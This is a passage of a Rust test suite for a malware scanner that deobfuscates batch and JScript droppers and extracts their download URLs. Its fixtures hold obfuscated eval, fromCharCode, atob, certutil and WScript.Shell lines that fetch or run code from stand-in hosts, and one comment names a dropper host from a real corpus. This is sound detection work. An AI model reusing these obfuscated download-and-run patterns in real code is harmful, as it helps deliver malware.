        assert!(env.traits.is_empty(), "false positive: {:?}", env.traits);
    }

    #[test]
    fn echoed_unicode_js_url_extracted() {
        // Real-corpus shape: echo eval('var...') > file; call file.
        // The \u sequence decodes to a JS line that contains the "//host/path"
        // tail as a string literal. No certutil / no base64 in this flavor.
        let mut env = Environment::new(&Config::default());
        // Build \u-escapes for: GetObject("//x.example.com/p1")
        // (the bare-URL regex expects a subdomain.host.TLD shape, matching
        // the dropper hosts seen in the corpus, e.g. 3leot7.rolexcity.bond)
        let raw = r#"GetObject("//x.example.com/p1")"#;
        let mut escaped = String::new();
        for c in raw.chars() {
            use std::fmt::Write;
            let _ = write!(&mut escaped, "\\u{:04x}", c as u32);
        }
        let deob = format!("echo eval('{escaped}'); > !V!\ncall !V!\n");
        crate::deob_scan::scan_echoed_unicode_js(&deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. }
                    if cmd == "echo-unicode-js" && src == "https://x.example.com/p1"
            )
        });
        assert!(has, "echoed-unicode JS url missed: {:?}", env.traits);
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. }
                    if src == "https://x.example.com/p1")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "echoed-unicode JS URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn full_url_in_decoded_js_extracted() {
        // When the decoded JS contains a full http(s) URL directly, the
        // generic URL_RE branch should catch it too.
        let plain =
            r#"var u="http://drop.example/x.exe"; new ActiveXObject("WScript.Shell").Run(u);"#;
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
        let deob = format!("echo {b64} > out.js\ncertutil -decode out.js out.js\ncall out.js\n");
        let urls = extract(&deob);
        assert!(
            urls.iter().any(|u| u == "http://drop.example/x.exe"),
            "got {:?}",
            urls
        );
    }

    #[test]
    fn binary_certutil_chunks_do_not_emit_js_urls() {
        // PE/resource strings can contain URL-looking fragments. The
        // certutil-decoded-JS path should only process decoded script, not
        // every base64 line from a binary dropper.
        let plain = b"MZ\x90\x00https://git\0https://linktr.ee/exmfn\0";
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
        let deob = format!("echo {b64} >> out.b64\ncertutil -decode out.b64 out.exe\n");
        let urls = extract(&deob);
        assert!(urls.is_empty(), "binary chunk produced JS URLs: {:?}", urls);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_url_extraction_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn js_string_concat_url_extracted() {
        let mut env = Environment::new(&Config::default());
        // Simulated JS: var a="sc"+"r"; b="ipt:ht"; c="tp://"; GetObject(a+b+c+"evil.example/x")
        // We push a simplified payload that after concat resolution contains http://evil.example/x
        let js = br#"var a="http://evil.example/x"; GetObject(a)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/x")
            )
        });
        assert!(has, "JS concat URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_string_hex_escape_decodes_to_url_char() {
        // Regression: parse_js_string_literal_at used to drop the backslash
        // from `\x2f`, corrupting the URL to `pathx2fp1...` and breaking
        // downstream analysis. Now the escape decodes to `/`.
        let mut env = Environment::new(&Config::default());
        let js = br#"var u="http://evil.example.com/path\x2fp1"+"\x2fp2"; eval(u)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example.com/path/p1/p2")
            )
        });
        assert!(has, "hex-escape URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_fromcodepoint_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"eval(String.fromCodePoint(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120))"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://evil.example/x"
            )
        });
        assert!(has, "fromCodePoint URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_fromcodepoint_member_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var m="fromCodePoint"; eval(String[m](104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,121))"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://evil.example/y"
            )
        });
        assert!(has, "fromCodePoint member URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_single_quoted_string_with_non_ascii_char_not_truncated() {
        // Regression: `c as u8 == quote` truncated a `char` codepoint to its
        // low byte, so 'ħ' (U+0127, low byte 0x27 = `'`) used to close the
        // string after one char. Confirm the URL inside the literal still
        // extracts.
        let mut env = Environment::new(&Config::default());
        let js = "var u='ħttp://evil.example.com/loader'; eval(u)"
            .as_bytes()
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        // The leading 'ħ' isn't a valid URL scheme so we won't get a URL
        // trait — but we should ALSO not crash. The important assertion is
        // that the literal contents are preserved end-to-end; we verify by
        // confirming the deob retains the host.
        let extracted: String = env
            .all_extracted_jscript
            .iter()
            .map(|b| String::from_utf8_lossy(b).into_owned())
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            extracted.contains("evil.example.com/loader"),
            "literal text was truncated: {:?}",
            extracted
        );
    }

    #[test]
    fn js_string_concat_multi_parts() {
        let mut env = Environment::new(&Config::default());
        // Test actual string concatenation: "http://"+"evil.example/x"
        let js = br#"var url = "http://"+"evil.example/x"; eval(url)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/x")
            )
        });
        assert!(has, "JS multi-part concat URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_decodeuricomponent_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"eval(decodeURIComponent("fetch%28%27https%3A%2F%2Fdecode-js.example%2Fp%27%29"))"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-js.example/p"
            )
        });
        assert!(has, "JS decodeURIComponent URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_decodeuricomponent_call_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"eval(decodeURIComponent.call(null, "https%3A%2F%2Fdecode-call-js.example%2Fp"))"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-call-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent.call URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_apply_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"eval(decodeURIComponent.apply(null, ["https%3A%2F%2Fdecode-apply-js.example%2Fp"]))"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-apply-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent.apply URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_apply_array_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["https%3A%2F%2Fdecode-apply-array-var-js.example%2Fp"]; eval(decodeURIComponent.apply(null, a))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-apply-array-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent.apply array variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_apply_bound_array_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var e = "https%3A%2F%2Fdecode-apply-bound-array-js.example%2Fp"; var a = [e]; eval(decodeURIComponent.apply(null, a))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-apply-bound-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent.apply bound array variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_function_alias_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var d = window.decodeURIComponent; eval(d("fetch%28%27https%3A%2F%2Fdecode-alias-js.example%2Fp%27%29"))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-alias-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent function alias URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_array_index_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["https%3A%2F%2Fdecode-array-index-js.example%2Fp"]; eval(decodeURIComponent(a[0]))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-array-index-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent array index URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_assigned_array_index_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["https%3A%2F%2Fdecode-assigned-array-index-js.example%2Fp"]; var e = a[0]; eval(decodeURIComponent(e))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-assigned-array-index-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent assigned array index URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_array_pop_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["noise", "https%3A%2F%2Fdecode-array-pop-js.example%2Fp"]; eval(decodeURIComponent(a.pop()))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-array-pop-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent array pop URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_assigned_array_pop_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["noise", "https%3A%2F%2Fdecode-assigned-array-pop-js.example%2Fp"]; var e = a.pop(); eval(decodeURIComponent(e))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-assigned-array-pop-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent assigned array pop URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_assigned_array_join_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["https%3A", "%2F%2Fdecode-assigned-array-join-js.example", "%2Fp"]; var e = a.join(""); eval(decodeURIComponent(e))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-assigned-array-join-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent assigned array join URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_assigned_array_slice_join_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a = ["noise", "https%3A", "%2F%2Fdecode-assigned-array-slice-join-js.example", "%2Fp", "noise"]; var e = a.slice(1, 4).join(""); eval(decodeURIComponent(e))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-assigned-array-slice-join-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent assigned array slice/join URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuricomponent_concat_arg_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var p = "https%3A%2F%2Fdecode-concat-arg-js."; var q = "example%2Fp"; eval(decodeURIComponent(p + q))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-concat-arg-js.example/p"
            )
        });
        assert!(
            has,
            "JS decodeURIComponent concat arg URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_unescape_malformed_percent_still_extracts_later_url() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"eval(unescape("%ZZfetch%28%27https%3A%2F%2Fdecode-js-lenient.example%2Fp%27%29"))"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decode-js-lenient.example/p"
            )
        });
        assert!(
            has,
            "JS unescape URL after malformed percent missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_unescape_u_escape_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"eval(unescape("%u0068%u0074%u0074%u0070%u0073%u003a%u002f%u002fjs-u-escape.example%u002fstage"))"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-u-escape.example/stage"
            )
        });
        assert!(has, "JS unescape %u URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_unescape_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var e = "https%3A%2F%2Funescape-var-js.example%2Fp"; var u = unescape(e); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://unescape-var-js.example/p"
            )
        });
        assert!(has, "JS unescape variable URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_window_decodeuricomponent_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var e = "https%3A%2F%2Fwindow-decode-js.example%2Fp"; var u = window.decodeURIComponent(e); eval(u)"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://window-decode-js.example/p"
            )
        });
        assert!(
            has,
            "JS window.decodeURIComponent variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_variable_member_decodeuricomponent_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var f = "decode" + "URIComponent"; var e = "https%3A%2F%2Fmember-decode-js.example%2Fp"; var u = window[f](e); eval(u)"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://member-decode-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member decodeURIComponent URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_direct_variable_member_decodeuricomponent_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var f = "decode" + "URIComponent"; eval(window[f]("https%3A%2F%2Fdirect-member-decode-js.example%2Fp"))"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://direct-member-decode-js.example/p"
            )
        });
        assert!(
            has,
            "JS direct variable member decodeURIComponent URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_decodeuri_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"eval(decodeURI("https%3A%2F%2Fdecodeuri-js.example%2Fp"))"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://decodeuri-js.example/p"
            )
        });
        assert!(has, "JS decodeURI URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_fromcharcode_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode({chars}); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-js.example/p"
            )
        });
        assert!(has, "JS fromCharCode URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_fromcharcode_expression_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-expr-js.example/p"
            .bytes()
            .map(|b| format!("0x{:x}+1-1", b))
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode({chars}); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-expr-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode expression URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_xor_expression_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-xor-js.example/p"
            .bytes()
            .map(|b| format!("0x{:x}^0x55^0x55", b))
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode({chars}); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-xor-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode xor expression URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_bracket_fromcharcode_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-bracket-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var u = String["fromCharCode"]({chars}); eval(u)"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-bracket-js.example/p"
            )
        });
        assert!(has, "JS bracket fromCharCode URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_variable_member_fromcharcode_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-member-var-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var m = "from" + "CharCode"; var u = String[m]({chars}); eval(u)"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-member-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member fromCharCode URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!("var u = String.fromCharCode.apply(null, [{chars}]); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-js.example/p"
            )
        });
        assert!(has, "JS fromCharCode.apply URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_variable_member_fromcharcode_apply_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-member-var-apply-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"var m = "from" + "CharCode"; var u = String[m].apply(null, [{chars}]); eval(u)"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-member-var-apply-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member fromCharCode.apply URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_inline_array_constructor_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-inline-ctor-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode.apply(null, Array({chars})); eval(u)")
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-inline-ctor-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode.apply inline Array(...) URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_inline_uint8array_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-inline-uint8array-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!("var u = String.fromCharCode.apply(null, new Uint8Array([{chars}])); eval(u)")
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-inline-uint8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode.apply inline Uint8Array URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_array_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-var-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var a = [{chars}]; var u = String.fromCharCode.apply(null, a); eval(u)")
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode.apply array variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_array_constructor_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-ctor-var-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!("var a = Array({chars}); var u = String.fromCharCode.apply(null, a); eval(u)")
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-ctor-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode.apply array constructor variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_apply_uint8array_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-apply-uint8array-var-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            "var a = new Uint8Array([{chars}]); var u = String.fromCharCode.apply(null, a); eval(u)"
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-apply-uint8array-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode.apply Uint8Array variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_spread_array_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-spread-var-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!("var a = [{chars}]; var u = String.fromCharCode(...a); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-spread-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode spread array variable URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_spread_inline_array_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-spread-inline-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode(...[{chars}]); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-spread-inline-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode spread inline array URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_variable_member_fromcharcode_spread_inline_array_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-member-var-spread-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"var m = "from" + "CharCode"; var u = String[m](...[{chars}]); eval(u)"#)
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-member-var-spread-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member fromCharCode spread inline array URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_spread_inline_array_constructor_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-spread-inline-ctor-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode(...Array({chars})); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-spread-inline-ctor-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode spread inline Array(...) URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_call_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-call-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!("var u = String.fromCharCode.call(null, {chars}); eval(u)").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-call-js.example/p"
            )
        });
        assert!(has, "JS fromCharCode.call URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_variable_member_fromcharcode_call_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-member-var-call-js.example/p"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"var m = "from" + "CharCode"; var u = String[m].call(null, {chars}); eval(u)"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-member-var-call-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member fromCharCode.call URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-js.example/p')",
        );
        let js = format!(r#"eval(atob("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-js.example/p"
            )
        });
        assert!(has, "JS atob payload URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_atob_template_literal_payload_url_extracted() {
